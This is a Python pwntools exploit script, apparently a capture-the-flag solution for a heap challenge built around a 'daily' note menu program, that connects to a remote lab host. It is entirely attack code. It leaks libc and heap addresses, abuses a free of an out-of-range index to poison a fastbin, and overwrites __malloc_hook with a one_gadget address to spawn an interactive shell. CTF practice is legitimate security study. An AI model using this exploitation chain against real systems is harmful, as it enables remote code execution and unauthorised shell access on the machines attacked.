#!/usr/bin/env python
from pwn import *
context.log_level='debug'
context.arch='amd64'
# p=process('./pwn')
p=remote('85c3e0fcae5e972af313488de60e8a5a.kr-lab.com',58512)

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('Your choice:')
    sl(str(i))

def debugf(payload=''):
    gdb.attach(p,payload)

def show():
    menu(1)

def add(length,content=''):
    menu(2)
    ru('Please enter the length of daily:')
    sl(str(length))
    ru('Now you can write you daily\n')
    if content=='':
        sd('a'*length)
    else:
        sd(content)

def delete(i):
    menu(4)
    ru('Please enter the index of daily:')
    sl(str(i))

def change(i,content):
    menu(3)
    ru('Please enter the index of daily:')
    sl(str(i))
    ru('Please enter the new daily\n')
    sd(content)

# debugf('')
add(0x80)     # 0
add(0x10)     # 1
add(0x80)     # 2
add(0x10)     # 3
add(0x80)     # 4
add(0x10)     # 5     

delete(0)
delete(2)
delete(4)
delete(1)

# debugf()
add(0x80,'\n')  # 0
add(0x80,'a'*0x8) # 1
show()
ru('0 : ')
libc_addr=u64(ru('1 : ')[0:6].ljust(8,'\x00'))
line=ru('3 : ')
heap_addr=u64(line[8:line.find('3 : ')].ljust(8,'\x00'))
libc_base=libc_addr-0x3c4b0a
heap_base=heap_addr-0x160
# print(hex(libc_addr))
# print(hex(heap_addr))

delete(0)
delete(1)
delete(3)
delete(5)
add(0x400)
delete(0)

add(0x60)
add(0x60,p64(0x200)+p64(heap_base+0x10))
print(hex(heap_addr))
to_free=heap_base+0x80
beg_addr=0x602060
idx=(to_free-beg_addr)/0x10
# debugf('nb 400C39')
delete(idx)

malloc_hook=0x3c4b10+libc_base
change(0,p64(malloc_hook-0x23))


one_off=0x45216
one_off=0x4526a
# one_off=0xf02a4
# one_off=0xf1147
one=libc_base+one_off
realloc=libc_base+0x00000000000846c0
add(0x60)
add(0x60,'\x00'*(0x13-8)+p64(one)+p64(realloc))

# debugf('nb 40099E')
menu(2)
ru('Please enter the length of daily:')
sl('16')

p.interactive()